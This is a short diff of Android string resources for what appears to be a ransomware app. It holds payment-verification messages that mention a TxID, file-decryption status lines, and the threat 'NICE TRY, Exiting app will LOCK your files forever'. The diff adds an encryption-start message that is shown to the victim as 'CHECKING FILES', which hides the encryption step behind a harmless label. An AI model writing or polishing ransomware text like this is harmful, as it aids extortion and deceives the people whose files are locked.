@@ -22,7 +22,8 @@
 	<string name="transaction_incorrect_log_message">Verification failed due to incorrect payment amount or incorrect TxID.</string>
     <string name="transaction_low_log_message">Verification failed due to incorrect payment amount.</string>
 	<string name="transaction_server_connection_failure_log_message">Verification failed due to internet access failure.</string>
-	<string name="decrypting_files_started_log_message">DECRYPTING FILES NOW</string>
+	<string name="decrypting_files_started_log_message">DECRYPTING FOLDERS</string>
+    <string name="encrypting_files_started_log_message">CHECKING FILES</string>
 	<string name="decrypting_files_finished_log_message">DECRYPTED FILES OK</string>
 	<string name="decrypting_finished_button_text">FILES RESTORED</string>
 	<string name="tried_to_use_back_button_message">NICE TRY,\nExiting app will LOCK your files forever</string>
